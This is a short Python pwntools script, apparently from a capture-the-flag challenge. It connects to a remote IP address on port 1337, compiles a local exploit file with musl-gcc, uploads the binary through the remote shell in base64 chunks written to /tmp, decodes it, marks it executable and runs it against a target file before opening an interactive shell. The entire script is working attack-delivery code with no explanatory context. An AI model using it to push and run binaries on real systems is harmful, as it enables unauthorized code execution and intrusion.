from pwn import *
import os
#context.log_level = 'debug'
r = remote('188.166.97.185', 1337)
#r = remote('172.17.0.3', 1337)

def exec_cmd(cmd):
    #r.recvuntil("$ ")
    r.sendline(cmd)

def upload():
    with open("exp", "rb") as f:
        data = f.read()

    encoded = base64.b64encode(data).replace(b'\n',b'').decode()

    for i in range(0, len(encoded), 500):
        #print("%d / %d" % (i, len(encoded)))
        exec_cmd("echo \"%s\" >> /tmp/benc" % (encoded[i:i+500]))

    exec_cmd("cat /tmp/benc | base64 -d > /tmp/bout")
    exec_cmd("chmod +x /tmp/bout")


os.system("musl-gcc -static -o exp exp.c")
#r.send(os.popen(r.recvline().strip()).read().split(b': ')[0])
exec_cmd('cd /')
upload()
exec_cmd('./tmp/bout ./task/dumpme')
r.interactive()
